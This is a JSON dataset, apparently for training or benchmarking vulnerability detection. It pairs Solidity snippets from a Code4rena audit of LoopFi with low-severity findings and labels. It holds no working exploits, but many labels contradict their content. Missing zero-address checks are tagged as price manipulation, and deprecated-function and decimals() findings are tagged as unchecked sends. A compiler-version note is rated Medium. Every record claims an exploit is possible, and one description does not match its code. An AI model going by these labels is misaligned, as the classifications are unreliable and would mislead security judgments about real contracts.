    "description": "Example: <https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>. In spite of the fact that EIP-20 [states](https://github.com/ethereum/EIPs/blob/46b9b698815abbfa628cd1097311deee77dd45c5/EIPS/eip-20.md?plain=1#L116) that zero-valued transfers must be accepted, some tokens, such as LEND will revert if this is attempted, which may cause transactions that involve other tokens (such as batch operations) to fully revert. Consider skipping the transfer if the amount is zero, which will also save gas. *Instances (36)*: File: src/CDPVault.sol 410:             poolUnderlying.safeTransferFrom(creditor, address(pool), amount);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.651,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n168:         addressProvider = addressProvider_; // U:[LP-1B]\n\n169:         underlyingToken = underlyingToken_; // U:[LP-1B]\n\n179:         interestRateModel = interestRateModel_; // U:[LP-1B]\n\n754:         interestRateModel = newInterestRateModel; // U:[LP-22B]\n\n773:         poolQuotaKeeper = newPoolQuotaKeeper; // U:[LP-23D]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"L-4\"></a>[L-4] Missing checks for `address(0)` when assigning values to address state variables",
    "description": "*Instances (15)*: File: src/PoolV3.sol 168:         addressProvider = addressProvider_; // U:[LP-1B] 169:         underlyingToken = underlyingToken_; // U:[LP-1B] 179:         interestRateModel = interestRateModel_; // U:[LP-1B]",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.36,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n182:         if (ERC20(underlyingToken_).decimals() != 18) {\n\n193:         return ERC4626.decimals();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-5\"></a>[L-5] `decimals()` is not a part of the ERC-20 standard",
    "description": "The `decimals()` function is not a part of the [ERC-20 standard](https://eips.ethereum.org/EIPS/eip-20), and was added later as an [optional extension](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/IERC20Metadata.sol). As such, some valid ERC20 tokens do not support this interface, so it is unsafe to blindly cast all tokens to this interface, and then call this function. *Instances (2)*: File: src/PoolV3.sol 182:         if (ERC20(underlyingToken_).decimals() != 18) { 193:         return ERC4626.decimals();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.134,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n204:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n221:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n293:         IERC20(asset()).safeApprove(rewardPool, amountIn);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-6\"></a>[L-6] Do not use deprecated library functions",
    "description": "*Instances (5)*: File: src/VaultRegistry.sol 33:         _setupRole(DEFAULT_ADMIN_ROLE, msg.sender); 34:         _setupRole(VAULT_MANAGER_ROLE, msg.sender); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/VaultRegistry.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.232,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n204:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n221:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n293:         IERC20(asset()).safeApprove(rewardPool, amountIn);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-7\"></a>[L-7] `safeApprove()` is deprecated",
    "description": "[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead. The function may currently work, but if a bug is found in this version of OpenZeppelin, and the version that you're forced to upgrade to no longer has this function, you'll encounter unnecessary delays in porting and testing replacement contracts. *Instances (3)*: File: src/vendor/AuraVault.sol 204:         IERC20(asset()).safeApprove(rewardPool, assets); 221:         IERC20(asset()).safeApprove(rewardPool, assets);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.232,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/VaultRegistry.sol\n\n33:         _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);\n\n34:         _setupRole(VAULT_MANAGER_ROLE, msg.sender);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-8\"></a>[L-8] Deprecated _setupRole() function",
    "description": "*Instances (2)*: File: src/VaultRegistry.sol 33:         _setupRole(DEFAULT_ADMIN_ROLE, msg.sender); 34:         _setupRole(VAULT_MANAGER_ROLE, msg.sender); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/VaultRegistry.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.152,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nSources:\n\n- <https://docs.openzeppelin.com/contracts/4.x/api/proxy#Initializable-_disableInitializers-->\n- <https://twitter.com/0xCygaar/status/1621417995905167360?s=20>\n\n*Instances (1)*:\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-9\"></a>[L-9] Do not leave an implementation contract uninitialized",
    "description": "An uninitialized implementation contract can be taken over by an attacker, which may impact the proxy. To prevent the implementation contract from being used, it's advisable to invoke the `_disableInitializers` function in the constructor to automatically lock it when it is deployed. This should look similar to this: /// @custom:oz-upgrades-unsafe-allow constructor constructor() { _disableInitializers(); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.191,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n568:                     requiredAmount = (remaining * WHOLE) / (WHOLE - penaltyFactor);\n\n1040:             rptStored = rptStored + ((newReward * 1e18) / lockedSupplyWithMultiplier);\n\n1200:             r.rewardPerSecond = (reward * 1e12) / rewardsDuration;\n\n1204:             r.rewardPerSecond = ((reward + leftover) * 1e12) / rewardsDuration;\n\n1463:             penaltyFactor = ((earning.unlockTime - block.timestamp) * HALF) / vestDuration + QUART; // 25% + timeLeft/vestDuration * 65%\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"L-10\"></a>[L-10] Division by zero not prevented",
    "description": "The divisions below take an input parameter which does not have any zero-value checks, which may lead to the functions reverting when zero is passed. *Instances (14)*: File: src/CDPVault.sol 723:         return (amount * cumulativeIndexNow) / cumulativeIndexLastUpdate - amount; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.541,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n279:                 (bool success, bytes memory response) = targets[i].call(data[i]);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"L-11\"></a>[L-11] External calls in an un-bounded `for-`loop may result in a DOS",
    "description": "Consider limiting the number of iterations in for-loops that make external calls *Instances (2)*: File: src/proxy/PositionAction.sol 279:                 (bool success, bytes memory response) = targets[i].call(data[i]); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionAction.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.133,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n279:                 (bool success, bytes memory response) = targets[i].call(data[i]);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"L-12\"></a>[L-12] External call recipient may consume all transaction gas",
    "description": "There is no limit specified on the amount of gas used, so the recipient can use up all of the transaction's gas, causing it to revert. Use `addr.call{gas: <amount>}(\"\")` or [this](https://github.com/nomad-xyz/ExcessivelySafeCall) library instead. *Instances (1)*: File: src/proxy/PositionAction.sol 279:                 (bool success, bytes memory response) = targets[i].call(data[i]); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionAction.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.133,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/oracle/BalancerOracle.sol\n\n74:     ) initializer {\n\n98:     function initialize(address admin, address manager) external initializer {\n\n100:         __AccessControl_init();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"L-13\"></a>[L-13] Initializers could be front-run",
    "description": "Initializers could be front-run, allowing an attacker to either set their own values, take ownership of the contract, and in the best case forcing a re-deployment *Instances (16)*: File: src/oracle/BalancerOracle.sol 74:     ) initializer { 98:     function initialize(address admin, address manager) external initializer {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.193,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n620:         if (unlockTime <= block.timestamp) revert InvalidTime();\n\n917:             if (locks[i].unlockTime > block.timestamp) {\n\n1231:         if (periodFinish < block.timestamp + rewardsDuration - rewardsLookback) {\n\n1319:             while (i < length && locks[i].unlockTime <= block.timestamp) {\n\n1461:         if (earning.unlockTime > block.timestamp) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-14\"></a>[L-14] Signature use at deadlines should be allowed",
    "description": "According to [EIP-2612](https://github.com/ethereum/EIPs/blob/71dc97318013bf2ac572ab63fab530ac9ef419ca/EIPS/eip-2612.md?plain=1#L58), signatures used on exactly the deadline timestamp are supposed to be allowed. While the signature may or may not be used for the exact EIP-2612 use case (transfer approvals), for consistency's sake, all deadlines should follow this semantic. If the timestamp is an expiration rather than a deadline, consider whether it makes more sense to include the expiration timestamp as a valid timestamp, as is done for deadlines. *Instances (7)*: File: src/reward/ChefIncentivesController.sol 410:                 if (_startTimeOffsets[i] < block.timestamp - startTime) revert InvalidStart(); 873:         if (endingTime.lastUpdatedTime + endingTime.updateCadence > block.timestamp) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.416,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n610:         _withdrawTokens(_address, amount, penaltyAmount, burnAmount, false);\n\n639:         _withdrawTokens(onBehalfOf, amount, penaltyAmount, burnAmount, claimRewards);\n\n657:         _withdrawTokens(onBehalfOf, amount, penaltyAmount, burnAmount, claimRewards);\n\n1288:                 rdntToken.safeTransfer(starfleetTreasury, burnAmount);\n\n1290:             rdntToken.safeTransfer(daoTreasury, penaltyAmount - burnAmount);\n\n1300:         emit Withdrawn(onBehalfOf, amount, _balances[onBehalfOf].locked, penaltyAmount, burnAmount, false);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-15\"></a>[L-15] Prevent accidentally burning tokens",
    "description": "Minting and burning tokens to address(0) prevention *Instances (12)*: File: src/PoolV3.sol 283:         assets = mint(shares, receiver); // U:[LP-2A,2B,5,7] 393:         _mint(receiver, shares); // U:[LP-6,7]",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.596,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n966:     function pause() external onlyOwner {\n\n973:     function unpause() external onlyOwner {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"L-16\"></a>[L-16] Owner can renounce while system is paused",
    "description": "The contract owner or single user with a role is not prevented from renouncing the role/ownership while the contract is paused, which would cause any user assets stored in the protocol, to be locked indefinitely. *Instances (4)*: File: src/reward/ChefIncentivesController.sol 966:     function pause() external onlyOwner { 973:     function unpause() external onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.154,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n995:             newReward = (rawReward * pool.allocPoint) / _totalAllocPoint;\n\n996:             newAccRewardPerShare = (newReward * ACC_REWARD_PRECISION) / lpSupply;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-17\"></a>[L-17] Possible rounding issue",
    "description": "Division by large numbers may result in the result being zero, due to solidity not supporting fractions. Consider requiring a minimum amount for the numerator to ensure that it is always larger than the denominator. Also, there is indication of multiplication and division without the use of parenthesis which could result in issues. *Instances (5)*: File: src/quotas/GaugeV3.sol 115:                     : uint16((uint256(qrp.minRate) * votesCaSide + uint256(qrp.maxRate) * votesLpSide) / totalVotes); // U:[GA-15] [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/quotas/GaugeV3.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.224,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n568:                     requiredAmount = (remaining * WHOLE) / (WHOLE - penaltyFactor);\n\n572:                     newPenaltyAmount = (requiredAmount * penaltyFactor) / WHOLE;\n\n573:                     newBurnAmount = (newPenaltyAmount * burn) / WHOLE;\n\n1102:         uint256 lockDurationWeeks = _lockPeriod[typeIndex] / AGGREGATION_EPOCH;\n\n1109:                 (userLocks[indexToAggregate].unlockTime / AGGREGATION_EPOCH == unlockTime / AGGREGATION_EPOCH) &&\n\n1191:             uint256 opExAmount = (reward * operationExpenseRatio_) / RATIO_DIVISOR;\n\n1463:             penaltyFactor = ((earning.unlockTime - block.timestamp) * HALF) / vestDuration + QUART; // 25% + timeLeft/vestDuration * 65%\n\n1464:             penaltyAmount = (earning.amount * penaltyFactor) / WHOLE;\n\n1465:             burnAmount = (penaltyAmount * burn) / WHOLE;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-18\"></a>[L-18] Loss of precision",
    "description": "Division by large numbers may result in the result being zero, due to solidity not supporting fractions. Consider requiring a minimum amount for the numerator to ensure that it is always larger than the denominator *Instances (37)*: File: src/PoolV3.sol 672:         return (_totalDebt.borrowed * baseInterestRate().calcLinearGrowth(timestamp)) / RAY; 677:         return (_baseInterestIndexLU * (RAY + baseInterestRate().calcLinearGrowth(timestamp))) / RAY;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.89,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/reward/ChefIncentivesController.sol)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Medium",
    "title": "<a name=\"L-19\"></a>[L-19] Solidity version 0.8.20+ may not work on other chains due to `PUSH0`",
    "description": "The compiler for Solidity 0.8.20 switches the default target EVM version to [Shanghai](https://blog.soliditylang.org/2023/05/10/solidity-0.8.20-release-announcement/#important-note), which includes the new `PUSH0` op code. This op code may not yet be implemented on all L2s, so deployment on these chains will fail. To work around this issue, use an earlier [EVM](https://docs.soliditylang.org/en/v0.8.20/using-the-compiler.html?ref=zaryabs.com#setting-the-evm-version-to-target) [version](https://book.getfoundry.sh/reference/config/solidity-compiler#evm_version). While the project itself may or may not compile with 0.8.20, other projects with which it integrates, or which extend this project may, and those projects will have problems deploying these contracts/libraries. *Instances (22)*: File: src/Flashlender.sol 2: pragma solidity ^0.8.19; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/Flashlender.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.114,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n      function acceptOwnership() external {\n          address sender = _msgSender();\n          require(pendingOwner() == sender, \"Ownable2Step: caller is not the new owner\");\n          _transferOwnership(sender);\n      }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-20\"></a>[L-20] Use `Ownable2Step.transferOwnership` instead of `Ownable.transferOwnership`",
    "description": "Use [Ownable2Step.transferOwnership](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol) which is safer. Use it as it is more secure due to 2-stage ownership transfer. **Recommended Mitigation Steps** Use <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol\">Ownable2Step.sol</a> function acceptOwnership() external { address sender = _msgSender();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.23,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/Silo.sol\n\n2: pragma solidity ^0.8.0;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-21\"></a>[L-21] File allows a version of solidity that is susceptible to an assembly optimizer bug",
    "description": "In solidity versions 0.8.13 and 0.8.14, there is an [optimizer bug](https://github.com/ethereum/solidity-blog/blob/499ab8abc19391be7b7b34f88953a067029a5b45/_posts/2022-06-15-inline-assembly-memory-side-effects-bug.md) where, if the use of a variable is in a separate `assembly` block from the block in which it was stored, the `mstore` operation is optimized out, leading to uninitialized memory. The code currently does not have such a pattern of execution, but it does use `mstore`s in `assembly` blocks, so it is a risk for future changes. The affected solidity versions should be avoided if at all possible. *Instances (1)*: File: src/Silo.sol 2: pragma solidity ^0.8.0; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/Silo.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.057,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n10: import {RecoverERC20} from \"./RecoverERC20.sol\";\n\n20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {\n\n430:     function recoverERC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {\n\n431:         _recoverERC20(tokenAddress, tokenAmount);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"L-22\"></a>[L-22] Sweeping may break accounting if tokens with multiple addresses are used",
    "description": "There have been [cases](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/) in the past where a token mistakenly had two addresses that could control its balance, and transfers using one address impacted the balance of the other. To protect against this potential scenario, sweep functions should ensure that the balance of the non-sweepable token does not change after the transfer of the swept tokens. *Instances (10)*: File: src/reward/ChefIncentivesController.sol 10: import {RecoverERC20} from \"./RecoverERC20.sol\"; 20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.375,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/CDPVault.sol\n\n196:         if (parameter == \"debtFloor\") vaultConfig.debtFloor = uint128(data);\n\n197:         else if (parameter == \"liquidationRatio\") vaultConfig.liquidationRatio = uint64(data);\n\n198:         else if (parameter == \"liquidationPenalty\") liquidationConfig.liquidationPenalty = uint64(data);\n\n199:         else if (parameter == \"liquidationDiscount\") liquidationConfig.liquidationDiscount = uint64(data);\n\n489:             uint96(cdd.debt),\n\n679:                 newCumulativeQuotaInterest = uint128(cumulativeQuotaInterest - quotaInterestPaid); // U:[CL-3]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"L-23\"></a>[L-23] Consider using OpenZeppelin's SafeCast library to prevent unexpected overflows when downcasting",
    "description": "Downcasting from `uint256`/`int256` in Solidity does not revert on overflow. This can result in undesired exploitation or bugs, since developers usually assume that overflows raise errors. [OpenZeppelin's SafeCast library](https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast) restores this intuition by reverting the transaction when such an operation overflows. Using this library eliminates an entire class of bugs, so it's recommended to use it always. Some exceptions are acceptable like with the classic `uint256(uint160(address(variable)))` *Instances (17)*: File: src/CDPVault.sol 196:         if (parameter == \"debtFloor\") vaultConfig.debtFloor = uint128(data); 197:         else if (parameter == \"liquidationRatio\") vaultConfig.liquidationRatio = uint64(data);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.594,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/Flashlender.sol\n\n105:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n133:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-24\"></a>[L-24] Unsafe ERC20 operation(s)",
    "description": "*Instances (2)*: File: src/Flashlender.sol 105:         underlyingToken.transferFrom(address(receiver), address(pool), total); 133:         underlyingToken.transferFrom(address(receiver), address(pool), total); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/Flashlender.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.206,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n279:                 (bool success, bytes memory response) = targets[i].call(data[i]);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-25\"></a>[L-25] Unsafe solidity low-level call can cause gas grief attack",
    "description": "Using the low-level calls of a solidity address can leave the contract open to gas grief attacks. These attacks occur when the called contract returns a large amount of data. So when calling an external contract, it is necessary to check the length of the return data before reading/copying it (using `returndatasize()`). *Instances (1)*: File: src/proxy/PositionAction.sol 279:                 (bool success, bytes memory response) = targets[i].call(data[i]);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.133,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n6: import {Initializable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\n\n7: import {OwnableUpgradeable} from \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\n\n8: import {PausableUpgradeable} from \"@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol\";\n\n20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"L-26\"></a>[L-26] Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions",
